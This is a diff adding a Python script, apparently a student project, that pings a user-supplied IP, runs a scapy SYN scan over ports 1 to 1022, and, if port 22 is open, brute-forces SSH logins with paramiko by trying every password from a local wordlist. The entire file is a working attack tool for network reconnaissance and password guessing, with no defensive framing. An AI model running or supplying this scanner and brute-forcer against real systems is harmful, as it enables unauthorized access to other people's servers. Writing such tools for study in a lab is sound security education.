@@ -1,0 +1,97 @@
+# imports
+from scapy.all import *
+from scapy.layers.inet import IP, TCP, ICMP
+import paramiko
+
+# variables:
+target = input("Write IP number of target: ")
+Registered_Ports = range(1, 1023)
+open_ports = []
+sourcePort = RandShort()
+
+
+# functios:
+def scanport(port):
+    sourcePort = RandShort()
+    conf.verb = 0
+    SynPkt = sr1(IP(dst=target) / TCP(sport=sourcePort, dport=port, flags="S"), timeout=0.5)
+
+    if SynPkt != None:
+        if SynPkt.haslayer(TCP):
+            print(f"Port {port} is checked!")
+
+            if SynPkt[TCP].flags == 0x12:
+                print(f"Port {port} is available!")
+                sr1(IP(dst=target) / TCP(sport=sourcePort, dport=port, flags="R"), timeout=2)
+                return True
+
+        return False
+    else:
+        return False
+
+
+def targetAvailability(target):
+    try:
+        conf.verb = 0
+
+        sendICMP = sr1(IP(dst=target) / ICMP(), timeout=3)
+    except Exception as error:
+        print(error)
+        return False
+
+    print(sendICMP)
+    if sendICMP != None:
+        return True
+    else:
+        return False
+
+
+def BruteForce(port):
+    with open(r"C:\Users\Kasia\PycharmProjects\FinalProject\PasswordList.txt", "r") as passwordsFile:
+        username = input("Out the login: ")
+
+        Sshconn = paramiko.SSHClient()
+        Sshconn.set_missing_host_key_policy(paramiko.AutoAddPolicy)
+
+        passwords = passwordsFile.read().split("\n")
+        for password in passwords:
+            print(f"Trying {username}:{password}")
+            try:
+                Sshconn.connect(target, port=int(port), username=username, password=password, timeout=1)
+                print(f"{password} success!")
+                Sshconn.close()
+                break
+            except paramiko.ssh_exception.AuthenticationException as error:
+                print(f"{password} failed")
+            except Exception as error:
+                print("Sth went wrong! " + str(error))
+
+            # main
+
+
+def Main():
+    print(target)
+    if targetAvailability(target):
+        for port in Registered_Ports:
+            status = scanport(port)
+            if status:
+                open_ports.append(port)
+                print(port)
+
+        print("scan is finished")
+
+        if 22 in open_ports:
+            client_reply = input("Do you want to perform brute-force attack on port 22? Y or N ")
+
+            if client_reply.upper() == "Y":
+                BruteForce(22)
+            else:
+                print("exit")
+        else:
+            print("The 22 port doesnt exist in open_ports")
+    else:
+        print("Target is unavailable")
+
+
+if __name__ == '__main__':
+    Main()
